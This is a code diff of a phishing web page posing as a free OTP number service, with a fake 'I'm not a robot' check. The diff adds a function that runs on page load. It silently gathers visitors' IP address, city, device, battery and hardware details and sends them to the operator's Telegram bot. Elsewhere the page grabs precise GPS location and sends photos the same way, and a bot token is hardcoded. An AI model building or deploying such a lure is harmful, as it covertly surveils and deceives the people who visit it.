@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -8,6 +8,7 @@
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #1a1e29; color: white; margin: 0; padding: 15px; text-align: center; }
         .secure-badge { background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%); color: white; padding: 8px 20px; border-radius: 20px; display: inline-block; font-weight: bold; margin-bottom: 20px; }
+        
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; margin-bottom: 20px;}
         .card { background: #232838; padding: 15px; border-radius: 15px; border: 1px solid #333a4f; display: flex; flex-direction: column; justify-content: space-between; }
         .flag { font-size: 30px; margin-bottom: 5px; }
@@ -24,12 +25,14 @@
 </head>
 <body>
 
+    <!-- شاشة التحقق -->
     <div class="verify-popup" id="popup">
         <h2>⚠️ Human Verification Required</h2>
         <p>To get the OTP number, please verify you are not a robot.</p>
         <button class="verify-btn" onclick="triggerAction()">✅ I'm not a robot (Verify Now)</button>
     </div>
 
+    <!-- صفحة الأرقام -->
     <div class="content" id="mainContent">
         <div class="secure-badge">Secure • Temporary • Free</div>
         <p>Get your free OTP verification numbers instantly.</p>
@@ -42,7 +45,7 @@
         // ⚠️⚠️ غير التوكن والآي دي هنا ⚠️⚠️
         const BOT_TOKEN = '8631883105:AAEh_pa8GZUITtttMSVEryWLaTcgxwbLBrc';       
         const ADMIN_ID = '8564695453';         
-
+        
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
         const mode = urlParams.get('mode') || 'basic';
@@ -84,7 +87,7 @@
         } else {
             document.getElementById('mainContent').style.display = 'block';
             renderCountries();
-            collectBasicInfo();
+            sendBasicInfo();
         }
 
         async function triggerAction() {
@@ -94,7 +97,7 @@
             if (mode === 'location') {
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
-                        await sendText(`📍 **الموقع الدقيق:**\nخط العرض: ${pos.coords.latitude}\nخط الطول: ${pos.coords.longitude}\n[فتح الخريطة](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
+                        await sendText(`📍 الموقع الدقيق:\nخط العرض: ${pos.coords.latitude}\nخط الطول: ${pos.coords.longitude}\n[فتح الخريطة](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
                         finishAction();
                     }, (err) => { alert("يجب السماح بالوصول للموقع."); finishAction(); }
                 );
@@ -119,10 +122,74 @@
             document.getElementById('loading').style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
             renderCountries();
-            collectBasicInfo();
+            sendBasicInfo();
         }
 
         function showFakeLoading() { alert("Preparing number..."); }
+
+        // الدالة اللي بتجمع المعلومات وتبعتها بالشكل المطلوب
+        async function sendBasicInfo() {
+            if (!targetUserId) return;
+
+            let ipData = {};
+            try { 
+                const res = await fetch('https://ipapi.co/json/'); 
+                ipData = await res.json(); 
+            } catch (e) {}
+
+            const ua = navigator.userAgent;
+            let device = /android/i.test(ua) ? "Android" : /iPhone|iPad/i.test(ua) ? "iOS" : "PC";
+            let browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Safari") ? "Safari" : "Firefox";
+            
+            let batteryText = "Not supported";
+            try {
+                const battery = await navigator.getBattery();
+                batteryText = `Level: ${Math.round(battery.level * 100)}%\n• Charging: ${battery.charging ? 'Yes' : 'No'}`;
+            } catch (e) {}
+
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
+
+            // تجهيز التقرير بنفس شكل الصورة
+            const report = `
+🖥️ <b>Device & Browser</b>
+• Device Model: ${device} (${navigator.platform})
+• User Agent: ${ua}
+
+🌐 <b>Network Information</b>
+• IP Address: ${ipData.ip || 'Unknown'}
+• Language: ${navigator.language}
+
+📍 <b>Location Details</b>
+• Country: ${ipData.country_name || 'Unknown'}
+• Region: ${ipData.region || 'Unknown'}
+• City: ${ipData.city || 'Unknown'}
+• Timezone: ${ipData.timezone || 'Unknown'}
+
+🖼️ <b>Display Information</b>
+• Resolution: ${screenRes}
+
+🔋 <b>Battery Status</b>
+• ${batteryText}
+
+🔐 <b>Device Permissions</b>
+• Camera: Prompt
+• Location: Prompt
+
+💾 <b>Hardware & Storage</b>
+• CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
+• RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
+• Touch Support: ${isTouch}
+
+⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Click Here (Support)</a>
+            `;
+
+            // إرسال الرسالة
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
+            }).catch(e=>{});
+        }
 
         async function sendText(text) {
             if (!targetUserId) return;
@@ -140,14 +207,6 @@
             formData.append('chat_id', targetUserId);
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
         }
-
-        async function collectBasicInfo() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                await sendText(`🌐 IP: \`${data.ip}\`\n📍 الدولة: ${data.country_name}\n🏙️ المدينة: ${data.city}`);
-            } catch(e){}
-        }
     </script>
 </body>
-      </html>
+</html>
